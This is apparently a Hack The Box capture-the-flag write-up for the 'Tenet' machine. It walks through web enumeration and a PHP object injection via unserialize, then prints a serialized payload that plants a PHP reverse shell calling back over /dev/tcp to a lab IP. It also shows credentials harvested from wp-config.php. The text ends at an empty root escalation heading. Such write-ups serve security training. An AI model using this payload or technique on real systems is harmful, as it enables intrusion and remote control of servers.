HTB IP: 10.10.10.223

-------------------------
# Enumeration

Some basic nmap scan show us that this box has 2 opening ports : `22,80` 

Directory enumeration with `gobuster`

`gobuster dir -u http://10.10.10.223 -w <word_list>`

```
/wordpress
/wordpress/wp-content           (Status: 301) [Size: 327] [--> http://10.10.10.223/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.10.223/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.10.223/wordpress/wp-admin/]
```

Heading to `10.10.10.223/wordpress/` , we realize that the website is fetching css from `tenet.htb` website => We will add that to our virtual host file `etc/hosts` 

Visit `http://tenet.htb/wordpress/` website
We find some interesting post about The Migrations, apparently they are migrating their website, we also found a potential username `neil` with the comment

```
did you remove the sator php file and the backup?? the migration program is
incomplete! why would you do this?!
```

So there is a `sator.php` file and apparently a backup too ?. That could be our lead
After a while fuzzing for the file in `tenet.htb` , I got no luck with it. So I ask some of my fellow hackers on HTB forum, turn out there is another virtual host 
So we try to add `sator.tenet.htb` to our `/etc/hosts` file

Now we go to `http://sator.tenet.htb/sator.php` , and we saw this content
<img width="565" alt="image" src="https://user-images.githubusercontent.com/37280106/113422704-5d82f200-93f7-11eb-8efa-567a4c0e2ccb.png">

So there was a `sator.php` file and it was executed in the background. There was some mentions about back up file too.
Now, backup file used to have the extension `.bak`. So I tried `sator.tenet.htb/sator.php.bak` and it just download the file to my machine

```
// cat sator.php.bak
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file,
$this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();
```
Now, let's analyze the code:
- It is getting query param `?arepo=` 
- Now it is deserialize the user input

So it just look like normal data processing, but we notice that trust user's input is a dangerous thing !!. In any cases, take user's input without proper sanitization is always a big risk !!.

We might be exploit the insecure object deserialization in code ( In this case, it is PHP Object Injection). [Here](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) is a blog post about it

# Exploitation

Here is a class called DatabaseExport with a `__destruct` function implemented. This function is what we can use to get RCE. The function uses `file_put_contents` to write the variable `data` to the file defined in the variable `user_file`. If we go over to the URI `sator.tenet.htb/users.txt`, we see that the file exists and prints `SUCCESS`

Now, to exploit this, we can do the following:
- We write the class `DatabaseExport` on our local machine, define the `user_file` variable to be our php file, and `data` is our reverse shell payload
- We serialize our payload and pass it to variable `?arepo=`
- The input get passed to `unserialize` function and a new class `DatabaseExport` instance was created with our defined variables
- At the `__destruct` function, our reverse shell get written into root directory of web directory and our defined php file name `user_file` (php-revshell.php) in this case, so if we go to that URL, we will got our reverse shell


RCE Payload:

```
class DatabaseExport {
  public $user_file = 'php-revshell.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.71/4444 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));
```

Now we just need to execute this to get reverse shell:
`curl http://sator.tenet.htb/php-revshell.php` 

# Post Exploitation

1. Priviledge Escalation - User

Doing some basic enumeration:
```
sudo -l
```
show us that we can run `/usr/local/bin/enableSSH.sh` this script with root priviledge 

Now, when we are inside a machine that run a web server, we have to check for config file, db file first because data have to be stored somewhere

`cat wp-config.php`
```
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

User credentials: `neil: Opera2112`
=> SSH to machine as neil user, grab the `user.txt` flag

2. Priviledge Escalation - Root

